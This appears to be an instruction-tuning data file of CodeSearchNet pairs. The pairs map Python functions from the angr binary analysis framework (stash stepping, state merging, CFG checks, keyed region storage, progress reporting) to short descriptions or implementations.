{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstepping a stash of states forward and categorize the successors appropriately.", "response": "def step(self, stash='active', n=None, selector_func=None, step_func=None,\n             successor_func=None, until=None, filter_func=None, **run_args):\n        \"\"\"\n        Step a stash of states forward and categorize the successors appropriately.\n\n        The parameters to this function allow you to control everything about the stepping and\n        categorization process.\n\n        :param stash:           The name of the stash to step (default: 'active')\n        :param selector_func:   If provided, should be a function that takes a state and returns a\n                                boolean. If True, the state will be stepped. Otherwise, it will be\n                                kept as-is.\n        :param step_func:       If provided, should be a function that takes a SimulationManager and\n                                returns a SimulationManager. Will be called with the SimulationManager\n                                at every step. Note that this function should not actually perform any\n                                stepping - it is meant to be a maintenance function called after each step.\n        :param successor_func:  If provided, should be a function that takes a state and return its successors.\n                                Otherwise, project.factory.successors will be used.\n        :param filter_func:     If provided, should be a function that takes a state and return the name\n                                of the stash, to which the state should be moved.\n        :param until:           (DEPRECATED) If provided, should be a function that takes a SimulationManager and\n                                returns True or False. Stepping will terminate when it is True.\n        :param n:               (DEPRECATED) The number of times to step (default: 1 if \"until\" is not provided)\n\n        Additionally, you can pass in any of the following keyword args for project.factory.successors:\n\n        :param jumpkind:        The jumpkind of the previous exit\n        :param addr:            An address to execute at instead of the state's ip.\n        :param stmt_whitelist:  A list of stmt indexes to which to confine execution.\n        :param last_stmt:       A statement index at which to stop execution.\n        :param thumb:           Whether the block should be lifted in ARM's THUMB mode.\n        :param backup_state:    A state to read bytes from instead of using project memory.\n        :param opt_level:       The VEX optimization level to use.\n        :param insn_bytes:      A string of bytes to use for the block instead of the project.\n        :param size:            The maximum size of the block, in bytes.\n        :param num_inst:        The maximum number of instructions.\n        :param traceflags:      traceflags to be passed to VEX. Default: 0\n\n        :returns:           The simulation manager, for chaining.\n        :rtype:             SimulationManager\n        \"\"\"\n        l.info(\"Stepping %s of %s\", stash, self)\n        # 8<----------------- Compatibility layer -----------------\n        if n is not None or until is not None:\n            if once('simgr_step_n_until'):\n                print(\"\\x1b[31;1mDeprecation warning: the use of `n` and `until` arguments is deprecated. \"\n                      \"Consider using simgr.run() with the same arguments if you want to specify \"\n                      \"a number of steps or an additional condition on when to stop the execution.\\x1b[0m\")\n            return self.run(stash, n, until, selector_func=selector_func, step_func=step_func,\n                            successor_func=successor_func, filter_func=filter_func, **run_args)\n        # ------------------ Compatibility layer ---------------->8\n        bucket = defaultdict(list)\n\n        for state in self._fetch_states(stash=stash):\n\n            goto = self.filter(state, filter_func=filter_func)\n            if isinstance(goto, tuple):\n                goto, state = goto\n\n            if goto not in (None, stash):\n                bucket[goto].append(state)\n                continue\n\n            if not self.selector(state, selector_func=selector_func):\n                bucket[stash].append(state)\n                continue\n\n            pre_errored = len(self._errored)\n            successors = self.step_state(state, successor_func=successor_func, **run_args)\n\n            # handle degenerate stepping cases here. desired behavior:\n            # if a step produced only unsat states, always add them to the unsat stash since this usually indicates a bug\n            # if a step produced sat states and save_unsat is False, drop the unsats\n            # if a step produced no successors, period, add the original state to deadended\n\n            # first check if anything happened besides unsat. that gates all this behavior\n            if not any(v for k, v in successors.items() if k != 'unsat') and len(self._errored) == pre_errored:\n                # then check if there were some unsats\n                if successors.get('unsat', []):\n                    # only unsats. current setup is acceptable.\n                    pass\n                else:\n                    # no unsats. we've deadended.\n                    bucket['deadended'].append(state)\n                    continue\n            else:\n                # there were sat states. it's okay to drop the unsat ones if the user said so.\n                if not self._save_unsat:\n                    successors.pop('unsat', None)\n\n            for to_stash, successor_states in successors.items():\n                bucket[to_stash or stash].extend(successor_states)\n\n        self._clear_states(stash=stash)\n        for to_stash, states in bucket.items():\n            self._store_states(to_stash or stash, states)\n\n        if step_func is not None:\n            return step_func(self)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a dict of state and successors.", "response": "def step_state(self, state, successor_func=None, **run_args):\n        \"\"\"\n        Don't use this function manually - it is meant to interface with exploration techniques.\n        \"\"\"\n        try:\n            successors = self.successors(state, successor_func=successor_func, **run_args)\n            stashes = {None: successors.flat_successors,\n                       'unsat': successors.unsat_successors,\n                       'unconstrained': successors.unconstrained_successors}\n\n        except (SimUnsatError, claripy.UnsatError) as e:\n            if self._hierarchy:\n                self._hierarchy.unreachable_state(state)\n                self._hierarchy.simplify()\n            stashes = {'pruned': [state]}\n\n        except tuple(self._resilience) as e:\n            self._errored.append(ErrorRecord(state, e, sys.exc_info()[2]))\n            stashes = {}\n\n        return stashes"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the set of successors for the given state.", "response": "def successors(self, state, successor_func=None, **run_args):\n        \"\"\"\n        Don't use this function manually - it is meant to interface with exploration techniques.\n        \"\"\"\n        if successor_func is not None:\n            return successor_func(state, **run_args)\n        return self._project.factory.successors(state, **run_args)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nmoves all unsatisfiable states in a given stash into a different stash.", "response": "def prune(self, filter_func=None, from_stash='active', to_stash='pruned'):\n        \"\"\"\n        Prune unsatisfiable states from a stash.\n\n        This function will move all unsatisfiable states in the given stash into a different stash.\n\n        :param filter_func: Only prune states that match this filter.\n        :param from_stash:  Prune states from this stash. (default: 'active')\n        :param to_stash:    Put pruned states in this stash. (default: 'pruned')\n\n        :returns:           The simulation manager, for chaining.\n        :rtype:             SimulationManager\n        \"\"\"\n        def _prune_filter(state):\n            to_prune = not filter_func or filter_func(state)\n            if to_prune and not state.satisfiable():\n                if self._hierarchy:\n                    self._hierarchy.unreachable_state(state)\n                    self._hierarchy.simplify()\n                return True\n            return False\n\n        self.move(from_stash, to_stash, _prune_filter)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef move(self, from_stash, to_stash, filter_func=None):\n        filter_func = filter_func or (lambda s: True)\n        stash_splitter = lambda states: reversed(self._filter_states(filter_func, states))\n        return self.split(stash_splitter, from_stash=from_stash, to_stash=to_stash)", "response": "Moves states from one stash to another."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef stash(self, filter_func=None, from_stash='active', to_stash='stashed'):\n        return self.move(from_stash, to_stash, filter_func=filter_func)", "response": "Moves some states from one stash to another."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndrops states from a stash.", "response": "def drop(self, filter_func=None, stash='active'):\n        \"\"\"\n        Drops states from a stash. This is an alias for move(), with defaults for the stashes.\n\n        :param filter_func: Drop states that match this filter. Should be a function that takes\n                            a state and returns True or False. (default: drop all states)\n        :param stash:       Drop matching states from this stash. (default: 'active')\n\n        :returns:           The simulation manager, for chaining.\n        :rtype:             SimulationManager\n        \"\"\"\n        return self.move(stash, self.DROP, filter_func=filter_func)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef apply(self, state_func=None, stash_func=None, stash='active', to_stash=None):\n        to_stash = to_stash or stash\n\n        def _stash_splitter(states):\n            keep, split = [], []\n            if state_func is not None:\n                for s in states:\n                    ns = state_func(s)\n                    if isinstance(ns, SimState):\n                        split.append(ns)\n                    elif isinstance(ns, (list, tuple, set)):\n                        split.extend(ns)\n                    else:\n                        split.append(s)\n            if stash_func is not None:\n                split = stash_func(states)\n            if to_stash is not stash:\n                keep = states\n            return keep, split\n\n        return self.split(_stash_splitter, from_stash=stash, to_stash=to_stash)", "response": "Applies a given function to every state in a given stash."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef split(self, stash_splitter=None, stash_ranker=None, state_ranker=None,\n              limit=8, from_stash='active', to_stash='stashed'):\n        \"\"\"\n        Split a stash of states into two stashes depending on the specified options.\n\n        The stash from_stash will be split into two stashes depending on the other options\n        passed in. If to_stash is provided, the second stash will be written there.\n\n        stash_splitter overrides stash_ranker, which in turn overrides state_ranker.\n        If no functions are provided, the states are simply split according to the limit.\n\n        The sort done with state_ranker is ascending.\n\n        :param stash_splitter:  A function that should take a list of states and return a tuple\n                                of two lists (the two resulting stashes).\n        :param stash_ranker:    A function that should take a list of states and return a sorted\n                                list of states. This list will then be split according to \"limit\".\n        :param state_ranker:    An alternative to stash_splitter. States will be sorted with outputs\n                                of this function, which are to be used as a key. The first \"limit\"\n                                of them will be kept, the rest split off.\n        :param limit:           For use with state_ranker. The number of states to keep. Default: 8\n        :param from_stash:      The stash to split (default: 'active')\n        :param to_stash:        The stash to write to (default: 'stashed')\n\n        :returns:               The simulation manager, for chaining.\n        :rtype:                 SimulationManager\n        \"\"\"\n        states = self._fetch_states(stash=from_stash)\n\n        if stash_splitter is not None:\n            keep, split = stash_splitter(states)\n        elif stash_ranker is not None:\n            ranked_paths = stash_ranker(states)\n            keep, split = ranked_paths[:limit], ranked_paths[limit:]\n        elif state_ranker is not None:\n            ranked_paths = sorted(states, key=state_ranker)\n            keep, split = ranked_paths[:limit], ranked_paths[limit:]\n        else:\n            keep, split = states[:limit], states[limit:]\n\n        keep, split = map(list, (keep, split))\n\n        self._clear_states(from_stash)\n        self._store_states(from_stash, keep)\n        self._store_states(to_stash, split)\n        return self", "response": "Splits a stash into two states."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef merge(self, merge_func=None, merge_key=None, stash='active'):\n        self.prune(from_stash=stash)\n        to_merge = self._fetch_states(stash=stash)\n        not_to_merge = []\n        if merge_key is None: merge_key = self._merge_key\n\n        merge_groups = [ ]\n        while to_merge:\n            base_key = merge_key(to_merge[0])\n            g, to_merge = self._filter_states(lambda s: base_key == merge_key(s), to_merge)\n            if len(g) <= 1:\n                not_to_merge.extend(g)\n            else:\n                merge_groups.append(g)\n\n        for g in merge_groups:\n            try:\n                m = self._merge_states(g) if merge_func is None else merge_func(*g)\n                not_to_merge.append(m)\n            except SimMergeError:\n                l.warning(\"SimMergeError while merging %d states\", len(g), exc_info=True)\n                not_to_merge.extend(g)\n\n        self._clear_states(stash)\n        self._store_states(stash, not_to_merge)\n        return self", "response": "Merge the states in a given stash."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _merge_states(self, states):\n\n        if self._hierarchy:\n            optimal, common_history, others = self._hierarchy.most_mergeable(states)\n        else:\n            optimal, common_history, others = states, None, []\n\n        if len(optimal) >= 2:\n            # We found optimal states (states that share a common ancestor) to merge.\n            # Compute constraints for each state starting from the common ancestor,\n            # and use them as merge conditions.\n            constraints = [s.history.constraints_since(common_history) for s in optimal]\n\n            o = optimal[0]\n            m, _, _ = o.merge(*optimal[1:],\n                              merge_conditions=constraints,\n                              common_ancestor=common_history.strongref_state\n                              )\n\n        else:\n            l.warning(\n                \"Cannot find states with common history line to merge. Fall back to the naive merging strategy \"\n                \"and merge all states.\"\n                )\n            s = states[0]\n            m, _, _ = s.merge(*states[1:])\n\n            others = []\n\n        if self._hierarchy:\n            self._hierarchy.add_state(m)\n\n        if len(others):\n            others.append(m)\n            return self._merge_states(others)\n        else:\n            return m", "response": "Merges a list of states into a single state."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nlaunch a postmortem debug shell at the site of the error.", "response": "def debug(self):\n        \"\"\"\n        Launch a postmortem debug shell at the site of the error.\n        \"\"\"\n        try:\n            __import__('ipdb').post_mortem(self.traceback)\n        except ImportError:\n            __import__('pdb').post_mortem(self.traceback)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef complement(self, other):\n\n        s = SimVariableSet()\n        s.register_variables = self.register_variables - other.register_variables\n        s.register_variable_offsets = self.register_variable_offsets - other.register_variable_offsets\n        s.memory_variables = self.memory_variables - other.memory_variables\n        s.memory_variable_addresses = self.memory_variable_addresses - other.memory_variable_addresses\n\n        return s", "response": "Calculate the complement of self and other."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_cfg_node(cfg, state):\n\n        call_stack_suffix = state.callstack.stack_suffix(cfg.context_sensitivity_level)\n        is_syscall = state.history.jumpkind is not None and state.history.jumpkind.startswith('Ijk_Sys')\n\n        block_id = cfg._generate_block_id(call_stack_suffix, state.addr, is_syscall)\n\n        return cfg.get_node(block_id)", "response": "Get the CFGNode object on the control flow graph given an angr state."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nperform a depth - first search on the given DiGraph and return an iterator of edges.", "response": "def _dfs_edges(graph, source, max_steps=None):\n        \"\"\"\n        Perform a depth-first search on the given DiGraph, with a limit on maximum steps.\n\n        :param networkx.DiGraph graph:  The graph to traverse.\n        :param Any source:              The source to begin traversal.\n        :param int max_steps:           Maximum steps of the traversal, or None if not limiting steps.\n        :return: An iterator of edges.\n        \"\"\"\n\n        if max_steps is None:\n            yield networkx.dfs_edges(graph, source)\n\n        else:\n            steps_map = defaultdict(int)\n            traversed = { source }\n            stack = [ source ]\n\n            while stack:\n                src = stack.pop()\n                for dst in graph.successors(src):\n                    if dst in traversed:\n                        continue\n                    traversed.add(dst)\n\n                    dst_steps = max(steps_map[src] + 1, steps_map[dst])\n\n                    if dst_steps > max_steps:\n                        continue\n\n                    yield src, dst\n\n                    steps_map[dst] = dst_steps\n                    stack.append(dst)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking if the specified address will be executed.", "response": "def check(self, cfg, state, peek_blocks):\n        \"\"\"\n        Check if the specified address will be executed\n\n        :param cfg:\n        :param state:\n        :param int peek_blocks:\n        :return:\n        :rtype: bool\n        \"\"\"\n\n        # Get the current CFGNode from the CFG\n        node = self._get_cfg_node(cfg, state)\n\n        if node is None:\n            # Umm it doesn't exist on the control flow graph - why?\n            l.error('Failed to find CFGNode for state %s on the control flow graph.', state)\n            return False\n\n        # crawl the graph to see if we can reach the target address next\n        for src, dst in self._dfs_edges(cfg.graph, node, max_steps=peek_blocks):\n            if src.addr == self.addr or dst.addr == self.addr:\n                l.debug(\"State %s will reach %#x.\", state, self.addr)\n                return True\n\n        l.debug('SimState %s will not reach %#x.', state, self.addr)\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking if the function will be reached with certain arguments.", "response": "def check(self, cfg, state, peek_blocks):\n        \"\"\"\n        Check if the specified function will be reached with certain arguments.\n\n        :param cfg:\n        :param state:\n        :param peek_blocks:\n        :return:\n        \"\"\"\n\n        # Get the current CFGNode\n        node = self._get_cfg_node(cfg, state)\n\n        if node is None:\n            l.error(\"Failed to find CFGNode for state %s on the control flow graph.\", state)\n            return False\n\n        # crawl the graph to see if we can reach the target function within the limited steps\n        for src, dst in self._dfs_edges(cfg.graph, node, max_steps=peek_blocks):\n            the_node = None\n            if src.addr == self.function.addr:\n                the_node = src\n            elif dst.addr == self.function.addr:\n                the_node = dst\n\n            if the_node is not None:\n                if self.arguments is None:\n                    # we do not care about arguments\n                    return True\n\n                else:\n                    # check arguments\n                    arch = state.arch\n                    state = the_node.input_state\n                    same_arguments = self._check_arguments(arch, state)\n\n                    if same_arguments:\n                        # all arguments are the same!\n                        return True\n\n        l.debug(\"SimState %s will not reach function %s.\", state, self.function)\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncheck if the specific function is reached with certain arguments.", "response": "def check_state(self, state):\n        \"\"\"\n        Check if the specific function is reached with certain arguments\n\n        :param angr.SimState state: The state to check\n        :return: True if the function is reached with certain arguments, False otherwise.\n        :rtype: bool\n        \"\"\"\n\n        if state.addr == self.function.addr:\n            arch = state.arch\n            if self._check_arguments(arch, state):\n                return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nmakes sure all current basic block on each state shows up in the CFG. For blocks that are not in the CFG, start CFG recovery from them with a maximum basic block depth of 100. :param simgr: :return:", "response": "def _peek_forward(self, simgr):\n        \"\"\"\n        Make sure all current basic block on each state shows up in the CFG. For blocks that are not in the CFG, start\n        CFG recovery from them with a maximum basic block depth of 100.\n\n        :param simgr:\n        :return:\n        \"\"\"\n\n        if self._cfg is None:\n\n            starts = list(simgr.active)\n            self._cfg_kb = KnowledgeBase(self.project)\n\n            self._cfg = self.project.analyses.CFGEmulated(kb=self._cfg_kb, starts=starts, max_steps=self._peek_blocks,\n                                                          keep_state=self._cfg_keep_states\n                                                          )\n\n        else:\n\n            starts = list(simgr.active)\n\n            self._cfg.resume(starts=starts, max_steps=self._peek_blocks)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _load_fallback_states(self, pg):\n\n        # take back some of the deprioritized states\n        l.debug(\"No more active states. Load some deprioritized states to 'active' stash.\")\n        if 'deprioritized' in pg.stashes and pg.deprioritized:\n            pg.active.extend(pg.deprioritized[-self._num_fallback_states : ])\n            pg.stashes['deprioritized'] = pg.deprioritized[ : -self._num_fallback_states]", "response": "Load the last N deprioritized states from the deprioritized stash and put them to the active stash."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _categorize_states(self, simgr):\n\n        past_active_states = len(simgr.active)\n        # past_deprioritized_states = len(simgr.deprioritized)\n\n        for goal in self._goals:\n            for p in simgr.active:\n                if self._check_goals(goal, p):\n                    if self._goal_satisfied_callback is not None:\n                        self._goal_satisfied_callback(goal, p, simgr)\n\n        simgr.stash(\n            filter_func=lambda p: all(not goal.check(self._cfg, p, peek_blocks=self._peek_blocks) for goal in\n                                      self._goals\n                                      ),\n            from_stash='active',\n            to_stash='deprioritized',\n        )\n\n        if simgr.active:\n            # TODO: pick some states from depriorized stash to active stash to avoid overfitting\n            pass\n\n        active_states = len(simgr.active)\n        # deprioritized_states = len(simgr.deprioritized)\n\n        l.debug('%d/%d active states are deprioritized.', past_active_states - active_states, past_active_states)\n\n        return simgr", "response": "Categorizes all states into two different groups."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef has_xor(self):\n\n        def _has_xor(expr):\n            return isinstance(expr, pyvex.IRExpr.Binop) and expr.op.startswith(\"Iop_Xor\")\n\n        found_xor = False\n\n        for block in self._function.blocks:\n            if block.size == 0:\n                continue\n            for stmt in block.vex.statements:\n                if isinstance(stmt, pyvex.IRStmt.Put):\n                    found_xor = found_xor or _has_xor(stmt.data)\n                elif isinstance(stmt, pyvex.IRStmt.WrTmp):\n                    found_xor = found_xor or _has_xor(stmt.data)\n            if found_xor:\n                break\n\n        if found_xor:\n            return { CodeTags.HAS_XOR }\n        return None", "response": "Detects if there is any xor operation in the function."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndetecting if there is any bitwise operation in the function.", "response": "def has_bitshifts(self):\n        \"\"\"\n        Detects if there is any bitwise operation in the function.\n\n        :return: Tags.\n        \"\"\"\n\n        def _has_bitshifts(expr):\n            if isinstance(expr, pyvex.IRExpr.Binop):\n                return expr.op.startswith(\"Iop_Shl\") or expr.op.startswith(\"Iop_Shr\") \\\n                       or expr.op.startswith(\"Iop_Sar\")\n            return False\n\n        found_bitops = False\n\n        for block in self._function.blocks:\n            if block.size == 0:\n                continue\n            for stmt in block.vex.statements:\n                if isinstance(stmt, pyvex.IRStmt.Put):\n                    found_bitops = found_bitops or _has_bitshifts(stmt.data)\n                elif isinstance(stmt, pyvex.IRStmt.WrTmp):\n                    found_bitops = found_bitops or _has_bitshifts(stmt.data)\n\n            if found_bitops:\n                break\n\n        if found_bitops:\n            return { CodeTags.HAS_BITSHIFTS }\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nmerges another KeyedRegion into this one.", "response": "def merge(self, other, replacements=None):\n        \"\"\"\n        Merge another KeyedRegion into this KeyedRegion.\n\n        :param KeyedRegion other: The other instance to merge with.\n        :return: None\n        \"\"\"\n\n        # TODO: is the current solution not optimal enough?\n        for _, item in other._storage.items():  # type: RegionObject\n            for so in item.stored_objects:  # type: StoredObject\n                if replacements and so.obj in replacements:\n                    so = StoredObject(so.start, replacements[so.obj], so.size)\n                self._object_mapping[so.obj_id] = so\n                self.__store(so, overwrite=False)\n\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef replace(self, replacements):\n\n        for old_var, new_var in replacements.items():\n            old_var_id = id(old_var)\n            if old_var_id in self._object_mapping:\n                # FIXME: we need to check if old_var still exists in the storage\n                old_so = self._object_mapping[old_var_id]  # type: StoredObject\n                self._store(old_so.start, new_var, old_so.size, overwrite=True)\n\n        return self", "response": "Replace variables with other variables."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef dbg_repr(self):\n        keys = self._storage.keys()\n        offset_to_vars = { }\n\n        for key in sorted(keys):\n            ro = self._storage[key]\n            variables = [ obj.obj for obj in ro.stored_objects ]\n            offset_to_vars[key] = variables\n\n        s = [ ]\n        for offset, variables in offset_to_vars.items():\n            s.append(\"Offset %#x: %s\" % (offset, variables))\n        return \"\\n\".join(s)", "response": "Get a debugging representation of this keyed region."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nadding a variable to this region at the given offset.", "response": "def add_variable(self, start, variable):\n        \"\"\"\n        Add a variable to this region at the given offset.\n\n        :param int start:\n        :param SimVariable variable:\n        :return: None\n        \"\"\"\n\n        size = variable.size if variable.size is not None else 1\n\n        self.add_object(start, variable, size)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nadding an object to this region at the given offset.", "response": "def add_object(self, start, obj, object_size):\n        \"\"\"\n        Add/Store an object to this region at the given offset.\n\n        :param start:\n        :param obj:\n        :param int object_size: Size of the object\n        :return:\n        \"\"\"\n\n        self._store(start, obj, object_size, overwrite=False)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_variable(self, start, variable):\n\n        size = variable.size if variable.size is not None else 1\n\n        self.set_object(start, variable, size)", "response": "Add a variable to this region at the given offset and remove all other variables that are fully covered by this variable."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_object(self, start, obj, object_size):\n\n        self._store(start, obj, object_size, overwrite=True)", "response": "Add an object to this region at the given offset and remove all other objects that are fully covered by this object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_base_addr(self, addr):\n\n        base_addr, container = self._get_container(addr)\n        if container is None:\n            return None\n        else:\n            return base_addr", "response": "Get the base offset of a specific key."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfinds variables covering the given region offset.", "response": "def get_variables_by_offset(self, start):\n        \"\"\"\n        Find variables covering the given region offset.\n\n        :param int start:\n        :return: A list of stack variables.\n        :rtype:  set\n        \"\"\"\n\n        _, container = self._get_container(start)\n        if container is None:\n            return []\n        else:\n            return container.internal_objects"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfinding objects covering the given region offset.", "response": "def get_objects_by_offset(self, start):\n        \"\"\"\n        Find objects covering the given region offset.\n\n        :param start:\n        :return:\n        \"\"\"\n\n        _, container = self._get_container(start)\n        if container is None:\n            return set()\n        else:\n            return container.internal_objects"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _store(self, start, obj, size, overwrite=False):\n\n        stored_object = StoredObject(start, obj, size)\n        self._object_mapping[stored_object.obj_id] = stored_object\n        self.__store(stored_object, overwrite=overwrite)", "response": "Store a variable into the storage."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef __store(self, stored_object, overwrite=False):\n\n        start = stored_object.start\n        object_size = stored_object.size\n        end = start + object_size\n\n        # region items in the middle\n        overlapping_items = list(self._storage.irange(start, end-1))\n\n        # is there a region item that begins before the start and overlaps with this variable?\n        floor_key, floor_item = self._get_container(start)\n        if floor_item is not None and floor_key not in overlapping_items:\n            # insert it into the beginning\n            overlapping_items.insert(0, floor_key)\n\n        # scan through the entire list of region items, split existing regions and insert new regions as needed\n        to_update = {start: RegionObject(start, object_size, {stored_object})}\n        last_end = start\n\n        for floor_key in overlapping_items:\n            item = self._storage[floor_key]\n            if item.start < start:\n                # we need to break this item into two\n                a, b = item.split(start)\n                if overwrite:\n                    b.set_object(stored_object)\n                else:\n                    self._add_object_with_check(b, stored_object)\n                to_update[a.start] = a\n                to_update[b.start] = b\n                last_end = b.end\n            elif item.start > last_end:\n                # there is a gap between the last item and the current item\n                # fill in the gap\n                new_item = RegionObject(last_end, item.start - last_end, {stored_object})\n                to_update[new_item.start] = new_item\n                last_end = new_item.end\n            elif item.end > end:\n                # we need to split this item into two\n                a, b = item.split(end)\n                if overwrite:\n                    a.set_object(stored_object)\n                else:\n                    self._add_object_with_check(a, stored_object)\n                to_update[a.start] = a\n                to_update[b.start] = b\n                last_end = b.end\n            else:\n                if overwrite:\n                    item.set_object(stored_object)\n                else:\n                    self._add_object_with_check(item, stored_object)\n                to_update[item.start] = item\n\n        self._storage.update(to_update)", "response": "Store a variable into the storage."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _initialize_progressbar(self):\n\n        self._progressbar = progressbar.ProgressBar(widgets=Analysis._PROGRESS_WIDGETS, maxval=10000 * 100).start()", "response": "Initialize the progressbar.\n        :return: None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _update_progress(self, percentage, **kwargs):\n\n        if self._show_progressbar:\n            if self._progressbar is None:\n                self._initialize_progressbar()\n\n            self._progressbar.update(percentage * 10000)\n\n        if self._progress_callback is not None:\n            self._progress_callback(percentage, **kwargs)", "response": "Update the progress with a percentage."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmark the progressbar as finished. :return: None", "response": "def _finish_progress(self):\n        \"\"\"\n        Mark the progressbar as finished.\n        :return: None\n        \"\"\"\n\n        if self._show_progressbar:\n            if self._progressbar is None:\n                self._initialize_progressbar()\n            if self._progressbar is not None:\n                self._progressbar.finish()\n\n        if self._progress_callback is not None:\n            self._progress_callback(100.0)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef merge(self, other, successor=None):\n\n        replacements = {}\n        if successor in self.dominance_frontiers:\n            replacements = self._make_phi_variables(successor, self, other)\n\n        merged_concrete_states =  [ self._concrete_states[0] ] # self._merge_concrete_states(other)\n\n        new_stack_region = self.stack_region.copy().replace(replacements)\n        new_stack_region.merge(other.stack_region, replacements=replacements)\n\n        new_register_region = self.register_region.copy().replace(replacements)\n        new_register_region.merge(other.register_region, replacements=replacements)\n\n        return VariableRecoveryState(successor, self._analysis, self.arch, self.function, merged_concrete_states,\n                                     stack_region=new_stack_region,\n                                     register_region=new_register_region\n                                     )", "response": "Merges two abstract states."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _addr_to_stack_offset(self, addr):\n\n        def _parse(addr):\n            if addr.op == '__add__':\n                # __add__ might have multiple arguments\n                parsed = [ _parse(arg) for arg in addr.args ]\n                annotated = [ True for annotated, _ in parsed if annotated is True ]\n                if len(annotated) != 1:\n                    # either nothing is annotated, or more than one element is annotated\n                    raise ValueError()\n\n                return True, sum([ offset for _, offset in parsed ])\n            elif addr.op == '__sub__':\n                # __sub__ might have multiple arguments\n\n                parsed = [ _parse(arg) for arg in addr.args ]\n                first_annotated, first_offset = parsed[0]\n                if first_annotated is False:\n                    # the first argument is not annotated. we don't support it.\n                    raise ValueError()\n                if any([ annotated for annotated, _ in parsed[1:] ]):\n                    # more than one argument is annotated. we don't support it.\n                    raise ValueError()\n\n                return True, first_offset - sum([ offset for _, offset in parsed[1:] ])\n            else:\n                anno = next(iter(anno for anno in addr.annotations if isinstance(anno, StackLocationAnnotation)), None)\n                if anno is None:\n                    if addr.op == 'BVV':\n                        return False, addr._model_concrete.value\n                    raise ValueError()\n                return True, anno.offset\n\n        # find the annotated AST\n        try: annotated, offset = _parse(addr)\n        except ValueError: return None\n\n        if not annotated:\n            return None\n\n        return self._to_signed(offset)", "response": "Convert an address to a stack offset."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _run_on_node(self, node, state):\n\n        l.debug('Analyzing block %#x, iteration %d.', node.addr, self._node_iterations[node])\n\n        concrete_state = state.get_concrete_state(node.addr)\n\n        if concrete_state is None:\n            # didn't find any state going to here\n            l.error(\"_run_on_node(): cannot find any state for address %#x.\", node.addr)\n            return False, state\n\n        state = state.copy()\n        self._instates[node.addr] = state\n\n        if self._node_iterations[node] >= self._max_iterations:\n            l.debug('Skip node %s as we have iterated %d times on it.', node, self._node_iterations[node])\n            return False, state\n\n        state.register_callbacks([ concrete_state ])\n\n        successors = self.project.factory.successors(concrete_state,\n                                                     addr=node.addr,\n                                                     size=node.size,\n                                                     opt_level=0  # disable the optimization in order to have\n                                                                  # instruction-level analysis results\n                                                     )\n        output_states = successors.all_successors\n\n        state.concrete_states = [ state for state in output_states if not state.ip.symbolic ]\n\n        self._outstates[node.addr] = state\n\n        self._node_iterations[node] += 1\n\n        return True, state", "response": "Execute the node and derive an output state."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _initialize_cfg(self):\n\n        self.kb.functions = FunctionManager(self.kb)\n\n        self._jobs_to_analyze_per_function = defaultdict(set)\n        self._completed_functions = set()", "response": "Re - create the DiGraph\n       "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef make_copy(self, copy_to):\n\n        for attr, value in self.__dict__.items():\n            if attr.startswith('__') and attr.endswith('__'):\n                continue\n            setattr(copy_to, attr, value)", "response": "Copy self attributes to the new object."}
